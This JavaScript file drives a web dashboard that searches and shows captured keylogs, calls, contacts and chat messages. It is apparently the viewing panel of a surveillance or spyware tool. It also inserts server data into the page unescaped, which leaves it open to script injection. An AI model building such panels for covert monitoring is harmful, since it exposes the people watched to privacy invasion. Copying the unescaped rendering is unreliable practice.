
// DOM Content Loaded Event Handler
document.addEventListener('DOMContentLoaded', initializeApp);

function initializeApp() {
    try {
        initializeFeatherIcons();
        initializeNavigation();
        initializeSearch();
    } catch (error) {
        console.error('Error initializing app:', error);
    }
}

function initializeFeatherIcons() {
    if (typeof feather !== 'undefined') {
        feather.replace();
    } else {
        console.warn('Feather Icons not loaded');
    }
}

function initializeNavigation() {
    const navItems = document.querySelectorAll('.sidebar nav li');
    navItems.forEach(item => {
        item.addEventListener('click', () => {
            updateActiveNavItem(item, navItems);
            showSection(item.getAttribute('data-section'));
        });
    });
}

function updateActiveNavItem(activeItem, allItems) {
    allItems.forEach(item => item.classList.remove('active'));
    activeItem.classList.add('active');
}

function initializeSearch() {
    const searchInput = document.getElementById('search-input');
    if (searchInput) {
        searchInput.addEventListener('input', debounce(searchMessages, 300));
    }
}

function showSection(sectionId) {
    if (!sectionId) {
        console.warn('No section ID provided');
        return;
    }

    const mainContent = document.querySelector('.main-content');
    if (!mainContent) {
        console.warn('Main content container not found');
        return;
    }
    
    const sections = mainContent.children;
    Array.from(sections).forEach(section => {
        if (section.classList.contains('container')) {
            section.style.display = 'none';
        }
    });

    const targetSection = document.querySelector(`[data-section="${sectionId}"]`);
    if (targetSection) {
        targetSection.style.display = 'block';
    } else {
        console.warn(`Section with data-section="${sectionId}" not found`);
    }
}

async function searchKeylogs() {
    const searchInput = document.getElementById('search-keylogs');
    const searchResults = document.getElementById('search-results-keylogs');
    const searchTerm = searchInput.value.trim();

    if (!searchTerm) {
        searchResults.innerHTML = '';
        return;
    }

    try {
        const response = await fetch('/search_keylogs', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `search_term=${encodeURIComponent(searchTerm)}`
        });

        if (!response.ok) throw new Error('Search request failed');
        
        const results = await response.json();
        displayKeylogSearchResults(results);
    } catch (error) {
        console.error('Error searching keylogs:', error);
        searchResults.innerHTML = '<p class="error">Error searching keylogs</p>';
    }
}

function displayKeylogSearchResults(results) {
    const searchResults = document.getElementById('search-results-keylogs');
    if (!results.length) {
        searchResults.innerHTML = '<p>No results found</p>';
        return;
    }

    const resultsList = results.map(result => `
        <tr>
            <td>${result.application}</td>
            <td>${result.time}</td>
            <td>${result.text}</td>
        </tr>
    `).join('');

    searchResults.innerHTML = `
        <table>
            <thead>
                <tr>
                    <th>Application</th>
                    <th>Time</th>
                    <th>Text</th>
                </tr>
            </thead>
            <tbody>
                ${resultsList}
            </tbody>
        </table>
    `;
}
async function searchMessages() {
    const searchInput = document.getElementById('search-input');
    const searchResults = document.getElementById('search-results');
    const searchTerm = searchInput.value.trim();

    if (!searchTerm) {
        searchResults.innerHTML = '';
        return;
    }

    try {
        const response = await fetch('/search', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `search_term=${encodeURIComponent(searchTerm)}`
        });

        if (!response.ok) throw new Error('Search request failed');
        
        const results = await response.json();
        displaySearchResults(results);
    } catch (error) {
        console.error('Error searching messages:', error);
        searchResults.innerHTML = '<p class="error">Error searching messages</p>';
    }
}

function displaySearchResults(results) {
    const searchResults = document.getElementById('search-results');
    
    if (!results.length) {
        searchResults.innerHTML = '<p>No results found</p>';
        return;
    }

    const resultsList = results.map(result => `
        <li>
            <p>${result.text}</p>
            <small>${result.type} from ${result.name} at ${result.time}</small>
        </li>
    `).join('');

    searchResults.innerHTML = `<ul>${resultsList}</ul>`;
}

function debounce(func, wait) {
    let timeout;
    return function(...args) {
        clearTimeout(timeout);
        timeout = setTimeout(() => func(...args), wait);
    };
}

// Content loading functions
async function loadContent(url) {
    try {
        const response = await fetch(url);
        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
        return await response.text();
    } catch (error) {
        console.error(`Error fetching ${url}:`, error);
        return '<p class="error-message">Error loading content. Please try again later.</p>';
    }
}

const loadCalls = () => loadSectionContent('calls', '/calls');
const loadKeylogs = () => loadSectionContent('keylogs', '/keylogs');
const loadContacts = () => loadSectionContent('contacts', '/contacts');
const loadChats = () => loadSectionContent('chats', '/');

async function loadSectionContent(sectionId, url) {
    const section = document.getElementById(sectionId);
    if (section) {
        const content = await loadContent(url);
        section.innerHTML = content;
        initializeFeatherIcons();
    }
}
